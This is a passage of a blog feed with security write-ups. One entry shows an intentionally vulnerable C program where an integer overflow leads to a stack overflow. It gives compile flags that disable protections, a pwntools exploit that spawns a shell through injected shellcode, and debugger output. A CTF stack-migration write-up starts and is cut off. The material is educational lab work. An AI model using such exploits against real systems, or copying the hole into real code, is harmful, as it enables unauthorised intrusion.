program</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720161136.png" alt=""></p><p><code>libs infomation</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720161116.png" alt=""></p><p><code>Use gdb to debug in underlying source level</code>Ôºö</p><p>reference: <a href="https://stackoverflow.com/questions/29955609/include-source-code-of-malloc-c-in-gdb" target="_blank" rel="noopener">https://stackoverflow.com/questions/29955609/include-source-code-of-malloc-c-in-gdb</a></p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720161923.png" class="lazyload"></p><h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p>So cool it isüòÑ!</p>]]></content>
      
      
      <categories>
          
          <category> Binary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary </tag>
            
            <tag> Compile </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Integer_Overflow</title>
      <link href="/2019/07/19/Integer-Overflow/"/>
      <url>/2019/07/19/Integer-Overflow/</url>
      
        <content type="html"><![CDATA[<p>Buffer overflow triggered by integer overflow‚òï‚Ä¶‚Ä¶</p><a id="more"></a><p>[TOC]</p><h1 id="Integer-Overflow"><a href="#Integer-Overflow" class="headerlink" title="Integer_Overflow"></a>Integer_Overflow</h1><blockquote><p>I have learned the <code>size_t ==&gt; unsigned char</code> integer overflowüôÉ‚Ä¶</p></blockquote><h2 id="Example-Source-Code"><a href="#Example-Source-Code" class="headerlink" title="Example Source Code"></a>Example Source Code</h2><p><code>Instructions to compile:</code></p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> 0 <span class="token operator">></span> /proc/sys/kernel/randomize_va_spacegcc -g -fno-stack-protector -z execstack size_over.c -o size_over</code></pre><p><code>size_over.c</code></p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">validate_msg</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">,</span><span class="token keyword">int</span> msg_size<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> msg_buf<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">char</span> msg_len <span class="token operator">=</span> msg_size<span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+]msg_len:%d \n"</span><span class="token punctuation">,</span>msg_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>msg_len <span class="token operator">>=</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> msg_len <span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"good!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>msg_buf<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    size_t msg_size<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input the size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>msg_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> payload<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">,</span>msg_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//printf("%s\n",payload);</span>    <span class="token function">validate_msg</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span>msg_size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Exploit-script"><a href="#Exploit-script" class="headerlink" title="Exploit script"></a>Exploit script</h2><blockquote><p>Here is my exploit script‚Ä¶</p><p>Maybe i should spend some time to learn Underlying libc‚Ä¶</p><p>From this example, we can know more about the way through overflow to execute shellcode in stack and the influence of <code>\x00</code>‚Ä¶‚Ä¶</p><p>Normally, execute shellcode in stack should make sure NX disabled‚Ä¶And hijacking program go to stack by using gadget <code>jmp esp</code>,or control Eip while knowing stack address‚Ä¶</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># diffrent enviroment has diffrent address......here is test result of my computer......</span>rbp <span class="token operator">=</span> <span class="token number">0x7fffffffdcb0</span>shellcode_addr <span class="token operator">=</span> <span class="token number">0x7fffffffdcb0</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token comment" spellcheck="true"># padding(12+8) + shellcode_addr(8)  </span>payload <span class="token operator">=</span> <span class="token string">""</span>payload <span class="token operator">+=</span> <span class="token number">12</span> <span class="token operator">*</span> <span class="token string">"a"</span>payload <span class="token operator">+=</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token string">"b"</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token operator">*</span><span class="token string">"\x90"</span>payload <span class="token operator">+=</span> shellcodepayload  <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">260</span><span class="token punctuation">,</span><span class="token string">"\x90"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./size_over'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span><span class="token comment" spellcheck="true">#pause()</span><span class="token comment" spellcheck="true">#p.recvuntil(":")</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'260\n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><code>Running to ret2shellcode_addr</code>:</p><pre class=" language-python"><code class="language-python">pwndbg<span class="token operator">></span> ni<span class="token number">0x00005555555551dc</span> <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>LEGEND<span class="token punctuation">:</span> STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ<span class="token punctuation">[</span> REGISTERS <span class="token punctuation">]</span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ RAX  <span class="token number">0x7fffffffdca4</span> ‚óÇ‚Äî <span class="token number">0x6161616161616161</span> <span class="token punctuation">(</span><span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span> RBX  <span class="token number">0x0</span> RCX  <span class="token number">0xffffdce062626262</span> RDX  <span class="token number">0x7fffff</span> RDI  <span class="token number">0x7fffffffdcb4</span> ‚óÇ‚Äî <span class="token number">0xffffdce062626262</span> RSI  <span class="token number">0x7fffffffdcd0</span> ‚óÇ‚Äî <span class="token number">0xffffdce062626262</span> R8   <span class="token number">0x7ffff7f9e500</span> ‚óÇ‚Äî add    ch<span class="token punctuation">,</span> ah <span class="token operator">/</span><span class="token operator">*</span> <span class="token number">0x7ffff7f9e500</span> <span class="token operator">*</span><span class="token operator">/</span> R9   <span class="token number">0x7fffffffdb67</span> ‚óÇ‚Äî <span class="token number">0xa87c57a943ef0034</span> <span class="token operator">/</span><span class="token operator">*</span> <span class="token string">'4'</span> <span class="token operator">*</span><span class="token operator">/</span> R10  <span class="token number">0xfffffffffffff4a8</span> R11  <span class="token number">0x7ffff7f58a60</span> ‚óÇ‚Äî add    byte ptr <span class="token punctuation">[</span>rdx<span class="token punctuation">]</span><span class="token punctuation">,</span> cl R12  <span class="token number">0x555555555090</span> ‚óÇ‚Äî xor    ebp<span class="token punctuation">,</span> ebp R13  <span class="token number">0x7fffffffe190</span> ‚óÇ‚Äî <span class="token number">0x1</span> R14  <span class="token number">0x0</span> R15  <span class="token number">0x0</span> RBP  <span class="token number">0x6262626262626262</span> <span class="token punctuation">(</span><span class="token string">'bbbbbbbb'</span><span class="token punctuation">)</span> RSP  <span class="token number">0x7fffffffdcb8</span> ‚Äî‚ñ∏ <span class="token number">0x7fffffffdce0</span> ‚óÇ‚Äî <span class="token number">0x9090909090909090</span> RIP  <span class="token number">0x5555555551dc</span> ‚óÇ‚Äî ret    ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ<span class="token punctuation">[</span> DISASM <span class="token punctuation">]</span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ   <span class="token number">0x5555555551ce</span>    lea    rdi<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rip <span class="token operator">+</span> <span class="token number">0xe46</span><span class="token punctuation">]</span>   <span class="token number">0x5555555551d5</span>    call   <span class="token number">0x555555555040</span>   <span class="token number">0x5555555551da</span>    nop       <span class="token number">0x5555555551db</span>    leave   ‚ñ∫ <span class="token number">0x5555555551dc</span>    ret    <span class="token operator">&lt;</span><span class="token number">0x7fffffffdce0</span><span class="token operator">></span>   <span class="token number">0x5555555551dd</span>    push   rbp   <span class="token number">0x5555555551de</span>    mov    rbp<span class="token punctuation">,</span> rsp   <span class="token number">0x5555555551e1</span>    sub    rsp<span class="token punctuation">,</span> <span class="token number">0x3f0</span>   <span class="token number">0x5555555551e8</span>    lea    rdi<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rip <span class="token operator">+</span> <span class="token number">0xe31</span><span class="token punctuation">]</span>   <span class="token number">0x5555555551ef</span>    mov    eax<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token number">0x5555555551f4</span>    call   <span class="token number">0x555555555050</span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ<span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0000</span>‚îÇ rsp  <span class="token number">0x7fffffffdcb8</span> ‚Äî‚ñ∏ <span class="token number">0x7fffffffdce0</span> ‚óÇ‚Äî <span class="token number">0x9090909090909090</span><span class="token number">01</span><span class="token punctuation">:</span><span class="token number">0008</span>‚îÇ      <span class="token number">0x7fffffffdcc0</span> ‚óÇ‚Äî <span class="token number">0x6161616161616161</span> <span class="token punctuation">(</span><span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span><span class="token number">02</span><span class="token punctuation">:</span><span class="token number">0010</span>‚îÇ      <span class="token number">0x7fffffffdcc8</span> ‚óÇ‚Äî <span class="token number">0x6262626261616161</span> <span class="token punctuation">(</span><span class="token string">'aaaabbbb'</span><span class="token punctuation">)</span><span class="token number">03</span><span class="token punctuation">:</span><span class="token number">0018</span>‚îÇ rsi  <span class="token number">0x7fffffffdcd0</span> ‚óÇ‚Äî <span class="token number">0xffffdce062626262</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">0020</span>‚îÇ      <span class="token number">0x7fffffffdcd8</span> ‚óÇ‚Äî <span class="token number">0x9090909000007fff</span><span class="token number">05</span><span class="token punctuation">:</span><span class="token number">0028</span>‚îÇ      <span class="token number">0x7fffffffdce0</span> ‚óÇ‚Äî <span class="token number">0x9090909090909090</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> ‚Üì‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚ñ∫ f <span class="token number">0</span>     <span class="token number">5555555551dc</span>   f <span class="token number">1</span>     <span class="token number">7fffffffdce0</span>   f <span class="token number">2</span> <span class="token number">6161616161616161</span>   f <span class="token number">3</span> <span class="token number">6262626261616161</span>   f <span class="token number">4</span> ffffdce062626262   f <span class="token number">5</span> <span class="token number">9090909000007fff</span>   f <span class="token number">6</span> <span class="token number">9090909090909090</span>   f <span class="token number">7</span> <span class="token number">9090909090909090</span>   f <span class="token number">8</span> <span class="token number">9090909090909090</span>   f <span class="token number">9</span> b848686a90909090   f <span class="token number">10</span> <span class="token number">732f2f2f6e69622f</span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄpwndbg<span class="token operator">></span> </code></pre><p><code>Exp Running Status</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190719161033.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Binary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary </tag>
            
            <tag> Overflow </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ciscn_Pwn_Stack_Migration</title>
      <link href="/2019/07/18/Ciscn-Pwn-Stack-Migration/"/>
      <url>/2019/07/18/Ciscn-Pwn-Stack-Migration/</url>
      
        <content type="html"><![CDATA[<p>Stack migration in Ciscn‚Ä¶</p><a id="more"></a><h1 id="Ciscn-Pwn-Stack-Migration"><a href="#Ciscn-Pwn-Stack-Migration" class="headerlink" title="Ciscn_Pwn_Stack_Migration"></a>Ciscn_Pwn_Stack_Migration</h1><h2 id="Main-Source-Code"><a href="#Main-Source-Code" class="headerlink" title="Main Source Code"></a>Main Source Code</h2><p>main:</p><pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> <span class="token punctuation">;</span> <span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span>                 public main<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> main            proc near               <span class="token punctuation">;</span> DATA XREF<span class="token punctuation">:</span> _start<span class="token operator">+</span><span class="token number">17</span>‚Üëo<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> var_4           <span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> argc            <span class="token operator">=</span> dword ptr  <span class="token number">8</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> argv            <span class="token operator">=</span> dword ptr  0Ch<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> envp            <span class="token operator">=</span> dword ptr  10h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> <span class="token punctuation">;</span> __unwind <span class="token punctuation">{</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span>                 lea     ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048603</span>                 and     esp<span class="token punctuation">,</span> 0FFFFFFF0h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048606</span>                 push    dword ptr <span class="token punctuation">[</span>ecx<span class="token number">-4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048609</span>                 push    ebp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804860A                 mov     ebp<span class="token punctuation">,</span> esp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804860C                 push    ecx<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804860D                 sub     esp<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048610</span>                 call    init<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048615</span>                 sub     esp<span class="token punctuation">,</span> 0Ch<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048618</span>                 push    offset s        <span class="token punctuation">;</span> <span class="token string">"Welcome, my friend. What's your name?"</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804861D                 call    _puts<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048622</span>                 add     esp<span class="token punctuation">,</span> 10h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048625</span>                 call    vul<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804862A                 mov     eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0804862F</span>                 mov     ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048632</span>                 leave<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048633</span>                 lea     esp<span class="token punctuation">,</span> <span class="token punctuation">[</span>ecx<span class="token number">-4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span>                 retn<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span> <span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// starts at 80485FF</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span> main            endp<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span></code></pre><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token 